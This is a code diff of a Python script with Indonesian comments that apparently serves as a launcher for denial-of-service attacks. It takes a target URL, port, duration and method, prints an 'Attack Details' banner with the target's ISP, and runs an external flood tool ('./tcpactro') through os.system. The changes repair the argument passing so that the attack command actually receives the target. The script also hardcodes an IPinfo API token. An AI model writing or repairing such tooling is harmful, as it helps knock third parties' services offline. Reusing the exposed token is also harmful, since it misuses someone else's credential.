@@ -2,13 +2,7 @@ import argparse
 from datetime import datetime
 import socket
 import ipinfo
-import socket
 import os
-import requests
-import random
-import getpass
-import time
-import sys
 
 # Token API dari IPinfo
 access_token = '40e69d29bf68ac'  # Ganti dengan token IPinfo Anda
@@ -72,7 +66,7 @@ def main(url, port, time, methods):
     print(f"        \x1b[38;2;233;233;233mISP     : [ \x1b[38;2;0;255;255m{isp_info} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mPORT    : [ \x1b[38;2;0;255;255m{port} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{time} \x1b[38;2;233;233;233m]")
-    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255mJOKER \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255m{methods} \x1b[38;2;233;233;233m]")
     print(f"   Attack Details :")
     print(f"        \x1b[38;2;233;233;233mSTATUS : [ \x1b[38;2;0;212;14mAttack With 1 Conc \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mHOUR   : [ \x1b[38;2;0;255;255m{current_time} \x1b[38;2;233;233;233m]")
@@ -85,8 +79,9 @@ if __name__ == "__main__":
     parser.add_argument('time', type=int, help='Time duration of attack')
     parser.add_argument('methods', type=str, help='Methods used')
     
-    os.system(f'./tcpactro GET {url} {port} {time} 8500')
-
     args = parser.parse_args()
 
-    main(args.url, args.port, args.time)
+    # Update the os.system call to use the parsed arguments
+    os.system(f'./tcpactro GET {args.url} {args.port} {args.time} 8500')
+
+    main(args.url, args.port, args.time, args.methods)
